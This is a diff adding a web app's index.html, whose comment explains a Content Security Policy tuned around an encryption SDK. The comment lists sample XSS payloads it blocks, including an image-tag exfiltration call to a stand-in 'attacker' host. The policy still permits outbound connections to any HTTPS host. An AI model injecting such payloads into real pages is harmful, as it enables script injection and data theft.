@@ -1,0 +1,63 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>NullFetch — confidential API marketplace</title>
+
+    <!--
+      Content Security Policy.
+      Goal: block the easy XSS exfiltration paths (inline scripts,
+      arbitrary eval, exfil to http://attacker/log) without breaking any
+      part of the Zama relayer SDK's encryption / decryption flow.
+
+      Carefully tuned around what the SDK actually needs:
+        - WASM instantiation (TFHE + KMS .wasm files in /assets/) →
+          'wasm-unsafe-eval'
+        - Web workers (the SDK spawns workers for parallel TFHE ops) →
+          worker-src 'self' blob:
+        - HTTPS connect targets (relayer, KMS, Sepolia RPCs) →
+          connect-src includes `https:` so the deployable api/web URLs
+          and any future provider endpoint work without re-issuing CSP.
+        - Vite HMR (dev only) → ws://localhost:* + http://localhost:*
+
+      What this blocks:
+        - <script>alert(1)</script> injection (no 'unsafe-inline')
+        - eval()-based payload bootstrap (no 'unsafe-eval' except WASM)
+        - Exfil via <img src=http://attacker/log?...> (no http: in img/connect)
+        - Exfil via WebSocket to non-localhost (no wss:* allowed)
+        - Clickjacking via iframe (frame-ancestors 'none')
+        - Base-URI hijacking, form action redirection, <object> embeds
+
+      See docs/threat-model.md for what this doesn't close.
+    -->
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="
+        default-src 'self';
+        script-src 'self' 'wasm-unsafe-eval';
+        style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+        font-src 'self' data: https://fonts.gstatic.com;
+        img-src 'self' data:;
+        connect-src 'self' https: http://localhost:* ws://localhost:* wss://localhost:*;
+        worker-src 'self' blob:;
+        child-src 'self' blob:;
+        frame-ancestors 'none';
+        base-uri 'self';
+        form-action 'self';
+        object-src 'none';
+      "
+    />
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+  </head>
+  <body>
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+  </body>
+</html>
